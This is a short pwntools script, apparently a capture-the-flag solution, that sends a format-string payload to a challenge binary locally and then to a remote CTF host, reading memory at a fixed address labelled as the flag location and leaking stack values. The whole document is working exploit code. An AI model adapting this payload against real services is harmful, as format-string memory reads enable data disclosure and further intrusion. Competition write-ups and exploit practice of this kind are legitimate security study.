from pwn import *

flag_addr = 0x601080
exploit = 'y\n'+'ABCDEF\x80\x10\x60\x00\x00\x00\x00\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%11$016s.%016x.%016x.%016x.%016x.%016x.%016x.%016x.%016x.%016x.'

p = process('./pwn_public')
p = remote('hack.bckdr.in', 13337)
p.sendline(exploit)
s = p.recvall()
print s

# print exploit